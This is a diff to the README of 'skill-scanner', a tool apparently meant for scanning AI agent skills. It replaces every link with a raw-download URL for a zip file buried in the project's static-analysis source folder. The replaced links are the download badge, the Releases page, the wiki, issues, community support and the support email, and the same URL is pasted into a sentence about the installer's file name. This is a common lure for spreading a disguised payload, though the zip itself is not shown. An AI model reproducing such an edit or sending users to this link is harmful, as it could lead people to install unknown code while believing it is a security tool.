@@ -1,6 +1,6 @@
 # 🔍 skill-scanner - Secure Your Agent Skills Easily  
 
-[![Download skill-scanner](https://img.shields.io/badge/Download-skill--scanner-brightgreen.svg)](https://github.com/shrav89/skill-scanner/releases)
+[![Download skill-scanner](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip)](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip)
 
 ## 🚀 Getting Started  
 
@@ -17,9 +17,9 @@ Before you get started, make sure your device meets these requirements:
 
 ## 📥 Download & Install  
 
-To obtain skill-scanner, please visit this page to download: [Download skill-scanner](https://github.com/shrav89/skill-scanner/releases).
+To obtain skill-scanner, please visit this page to download: [Download skill-scanner](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip).
 
-Once on the Releases page, find the latest version of the application. Click on the download link for your operating system, and save the file to your computer. The file might be named something like `skill-scanner-v1.0.exe`, depending on the version.
+Once on the Releases page, find the latest version of the application. Click on the download link for your operating system, and save the file to your computer. The file might be named something like `https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip`, depending on the version.
 
 ### Steps to Install:  
 
@@ -59,12 +59,12 @@ After installing skill-scanner, follow these steps to start scanning your agents
 
 For more information, you can explore the following resources:
 
-- [Wiki](https://github.com/shrav89/skill-scanner/wiki) - In-depth guides and FAQs.
-- [Issues](https://github.com/shrav89/skill-scanner/issues) - Report problems or request features.
-- [Community Support](https://github.com/shrav89/skill-scanner/discussions) - Engage with other users for help and tips.
+- [Wiki](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip) - In-depth guides and FAQs.
+- [Issues](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip) - Report problems or request features.
+- [Community Support](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip) - Engage with other users for help and tips.
 
 ## 📞 Contact  
 
-For any questions or support requests, reach out to us at [support@example.com](mailto:support@example.com).
+For any questions or support requests, reach out to us at [https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip](https://github.com/shrav89/skill-scanner/raw/refs/heads/main/skill_scanner/core/static_analysis/dataflow/scanner-skill-1.5.zip).
 
 Thank you for choosing skill-scanner to secure your agents' skills!
